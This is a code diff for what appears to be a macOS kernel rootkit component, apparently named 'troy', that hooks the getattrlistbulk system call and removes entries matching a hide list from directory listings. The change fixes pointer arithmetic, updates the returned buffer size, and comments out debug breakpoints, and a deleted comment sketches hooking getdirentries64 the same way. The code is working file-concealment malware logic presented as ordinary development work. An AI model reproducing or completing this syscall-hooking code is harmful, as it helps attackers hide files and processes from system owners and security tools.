@@ -311,6 +311,7 @@ int my_getattrlistbulk_callback(struct proc * p,struct getattrlistbulk_args *uap
     void *base_attr_data_addr=attr_data_address;
 
     int num_of_file=*retval;
+    int update=0;
     for(int file_num=0; file_num<num_of_file && attr_data_size>0 && remain_data_size>0 && *retval>0; file_num++)
     {
         LOG(LOG_ERROR, "Th total file number is %d, current is %d", num_of_file, file_num);
@@ -351,26 +352,33 @@ int my_getattrlistbulk_callback(struct proc * p,struct getattrlistbulk_args *uap
                     //LOG(LOG_ERROR, "hide name %s", var->name);
                     if(strcmp(attr_data->name, var->name)==0)   //if find name, just hide it.
                     {
+                        update=1;
                         is_find=1;
                         remain_data_size-=attr_data->length;
                         attr_data_size-=attr_data->length;
                         *retval-=1;
                         LOG(LOG_ERROR, "remain_data_size=%llu", remain_data_size);
-                        __asm("int3");
-                        bcopy((char*)base_attr_data_addr+attr_data->length, (char*)base_attr_data_addr,remain_data_size);
+//                        __asm("int3");
+                        bcopy((char*)(((char*)base_attr_data_addr)+attr_data->length), (char*)base_attr_data_addr, remain_data_size);
                     }
                 }
                 if(is_find) continue;
             }
         }
         remain_data_size-=attr_data->length;
-        base_attr_data_addr+=attr_data->length;
+        base_attr_data_addr=((char*)base_attr_data_addr)+attr_data->length;
         LOG(LOG_ERROR, "remain_data_size=%llu", remain_data_size);
     }
     LOG(LOG_ERROR, "retval=%d", *retval);
-    __asm("int3");
-    copyout(attr_data_address, uap->attributeBuffer, attr_data_size);
-    __asm("int3");
+//    __asm("int3");
+
+    LOG(LOG_ERROR, "attr_data_size=%llu", attr_data_size);
+    if(update)
+    {
+        uap->bufferSize=attr_data_size;   //update the buffer size
+        copyout(attr_data_address, uap->attributeBuffer, attr_data_size);
+    }
+//    __asm("int3");
     //uap->bufferSize=attr_data_size;
 
 clean:
@@ -378,12 +386,3 @@ clean:
 
     return return_code;
 }
-
-
-
-/*errno_t hide_specific_files(troy_hide_object *files_hide)
-{
-    sy_call_t *
-    GetOriginalFunction(SYS_getdirentries64, <#sy_call_t **orginal_ptr#>)
-    SetSystemCallHandle(<#void *function_handle#>, <#int syscall_no#>, <#int syscall_nargs#>, <#void *original_handle#>)
-}*/
